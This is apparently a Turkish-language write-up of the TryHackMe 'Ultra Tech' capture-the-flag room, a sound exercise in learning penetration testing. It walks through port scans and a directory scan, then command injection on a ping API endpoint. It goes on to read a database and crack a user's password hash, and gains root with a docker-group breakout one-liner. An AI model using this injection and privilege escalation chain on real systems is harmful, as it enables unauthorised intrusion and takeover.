---
title: Ultra Tech Writeup
description: >-
  The basics of Penetration Testing, Enumeration, Privilege Escalation and WebApp testing
author: Burak
date: 2026-08-28 23:40:00 +0800
categories: [CTF, Tryhackme, Medium]
tags: [CTF]
pin: false
---

## Task 1
#### Deploy the machine
`Check butonuna basmanız yeterli.`

## Task 2
#### Which software is using the port 8081?

nmap taraması sonucunda karşımıza 4 tane açık port çıkıyor.

```
rustscan -a 10.67.142.67
----------------------------------
Nmap scan report for 10.67.142.67
Host is up, received conn-refused (0.12s latency).
Scanned at 2026-08-28 23:47:25 +03 for 0s

PORT      STATE SERVICE         REASON
21/tcp    open  ftp             syn-ack
22/tcp    open  ssh             syn-ack
8081/tcp  open  blackice-icecap syn-ack
31331/tcp open  unknown         syn-ack
```

8081 portuna detaylı bir şekilde baktığımızda hangi yazılımı kullandığını bulabiliriz.
```
nmap -sV -sC -p 8081 10.67.142.67
----------------------------------
PORT     STATE SERVICE VERSION
8081/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-cors: HEAD GET POST PUT DELETE PATCH

```

Cevap: `Node.js`
#### Which other non-standard port is used?
Burada standart olmayan bir port numarasını soruyor. Daha önce ki nmap taramasında bulduğumuz en büyük sayıyı cevap olarak yazabiliriz.

Cevap: `31331`
#### Which software using this port?
Burada standart omayan port numarasını detaylı şekilde taradığımızda sorunun cevabına ulaşabiliyoruz.
```
nmap -sV -sC -p 31331 10.67.142.67
----------------------------------
PORT      STATE SERVICE VERSION
31331/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
|_http-server-header: Apache/2.4.41 (Ubuntu)

```

Cevap: `Apache`

#### Which GNU/Linux distribution seems to be used?
Nmap sorgusundan bulduğumuz işletim sistemi sorunun cevabıdır.

Cevap: `Ubuntu`

#### The software using the port 8081 is a REST api, how many of its routes are used by the web application?

Burada 8081 portu üzerinde directory scan yapmamız gerekiyor. 

```
dirsearch -u http://10.64.150.240:8081
----------------------------------
  _|. _ _  _  _  _ _|_    v0.5.0
 (_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25
Wordlist size: 12295

Target: http://10.64.150.240:8081/

[00:30:30] Scanning: 
[00:30:56] 200 -    39B - /auth
[00:30:56] 200 -    39B - /auth/
[00:31:20] 500 -    1KB - /ping

Task Completed
```
2 adet endpoint bulduk.

Cevap: `2`

## Task 3

`/auth/` sayfasına geldiğimizde bizden kullanıcı adı ve şifre istiyor.
![alt text](/assets/img/ultratech/image.png)

Şifre hakkında en ufak fikrim olmadığından enumeration'a devam ediyorum.

Ayrıca 31331 portunda gezerken `/partners.html` sayfasında partnerlere özel bir giriş yeri olduğunu fark ettim.
![alt text](/assets/img/ultratech/image-1.png)

Directory scan yaptıktan sonra 31331'e, normalde erişemediğimiz ama burada izin verilen bir path buldum. `/js/`'de javascript dosyaları yer alıyordu.
![alt text](/assets/img/ultratech/image-2.png)

`api.js`'ye girdiğimde bir endpoint daha buldum.

![alt text](/assets/img/ultratech/image-3.png)

dehb.wtf'a ping isteği yolladıktan sonra endpoint'in çalıştığı doğrulandı.
![alt text](/assets/img/ultratech/image-4.png)

ping atmasını beklememek için direkt 127.0.0.1'a istek atarak command injection denemeye başladım.

Birkaç denemeden sonra %0 ile command injection yapıldığı ortaya çıktı.
![alt text](/assets/img/ultratech/image-5.png)

Ayrıca ls komudunu çalıştırdıktan sonra `utech.db.sqlite` dosyasını görüyoruz. bu, **There is a database lying around, what is its filename?** sorusunun cevabıdır.

`utech.db.sqlite` dosyasını cat ile okuduğumda, database dosyasında 2 adet kullanıcı beliriyor. bunlardan ilki `r00t` olan kişinin şifre hash'i **What is the first user's password hash?** sorusunun cevabıdır. (`f357a0c52799563c7c7b76c1e7543a32`)

Bu şifreyi cracklediğimizde karşımıza bu şifre çıkıyor:
![alt text](/assets/img/ultratech/image-6.png)

Böylelikle **What is the password associated with this hash?** sorusunun cevabı `n100906` oluyor.

ssh'a r00t olarak girdikten sonra id komutunu yazdım ve bunla karşılaştım.
![alt text](/assets/img/ultratech/image-7.png)

docker grubundayız ve bu bize root yetkisi almamızı sağlar.

Bu komudu kullanarak root olduk. `docker run -v /:/mnt --rm -it bash chroot /mnt sh`
![alt text](/assets/img/ultratech/image-8.png)

/root/.ssh/id_rsa'da ise ssh anahtarının ilk 9 hanesi sorumuzun cevabı olmakta. (`MIIEogIBA`)
![alt text](/assets/img/ultratech/image-9.png)